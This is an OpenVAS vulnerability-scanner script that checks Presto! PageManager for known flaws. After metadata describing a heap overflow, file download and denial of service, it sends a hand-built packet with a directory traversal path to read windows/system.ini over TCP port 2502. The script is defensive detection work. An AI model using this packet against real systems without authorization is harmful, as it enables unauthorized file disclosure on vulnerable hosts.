###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_presto_pagemanager_mult_vuln.nasl 7549 2017-10-24 12:10:14Z cfischer $
#
# Presto! PageManager Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802620");
  script_bugtraq_id(52503);
  script_version("$Revision: 7549 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-10-24 14:10:14 +0200 (Tue, 24 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-03-15 15:15:15 +0530 (Thu, 15 Mar 2012)");
  script_name("Presto! PageManager Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("General");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(2502);
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48380/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52503");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18600/");
  script_xref(name:"URL", value:"http://aluigi.org/adv/pagemanager_1-adv.txt");

  tag_impact = "Successful exploitation may allow remote attackers to download
  arbitrary files, execute arbitrary code in the context of the application or
  cause denial-of-service conditions.

  Impact Level: Application/System";

  tag_affected = "Presto! PageManager version 9.01 and prior";

  tag_insight = "- A boundary error in the Network Group Service when processing certain
   network requests can be exploited to cause a heap-based buffer overflow.
 - An input validation error in the Network Group Service when processing
   certain network requests can be exploited to download arbitrary files via
   a specially crafted packet sent to TCP port 2502.
 - An error in the Network Group Service when processing certain network
   requests can be exploited to cause an unhandled exception and terminate
   the service.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "The host is running Presto! PageManager and is prone to multiple
  vulnerabilities.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");

## Variable Initialization
soc = 0;
req = "";
res = "";

## Network Group Service Port
port = 2502;

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct Directory Traversal Attack
req = raw_string(0x00, 0x00, 0x01, 0x00, 0x15, 0x00, 0x00, 0x00,
                 0x6d, 0x79, 0x62, 0x6c, 0x61, 0x68, 0x00, 0x66,
                 0x69, 0x6c, 0x65, 0x00, 0x01, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
                 0x00, 0x00, 0x01, 0x00, 0x00) +
                 "../../../../windows/system.ini" +
                 crap(data:raw_string(0x00), length: 228) +
                 raw_string(0x20, 0x00, 0x00, 0x00, 0x00, 0x00);

## Send attack request and receive the response
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

## Check for patterns present in system.ini file in the response
if(res && "[drivers]" >< res){
  security_message(port);
}
